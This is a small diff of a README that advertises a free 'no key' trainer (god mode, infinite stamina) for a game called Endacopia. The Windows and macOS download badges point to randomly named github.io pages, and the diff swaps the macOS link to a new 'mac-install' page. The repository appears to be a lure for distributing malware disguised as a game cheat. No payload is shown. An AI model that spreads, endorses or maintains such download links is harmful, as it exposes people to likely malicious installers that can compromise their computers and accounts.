@@ -4,7 +4,7 @@ Endacopia trainer: god mode, infinite stamina — free trainer, no key.
 
 [![Download](https://img.shields.io/badge/Download-Trainer-blue?style=for-the-badge)](https://uvkayskoqsgd.github.io/windows-files/)
 [![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://uvkayskoqsgd.github.io/windows-files/)
-[![macOS](https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://uvkayskoqsgd.github.io/windows-files/)
+[![macOS](https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://jaifcflcufqn.github.io/mac-install/)
 
 ---
 
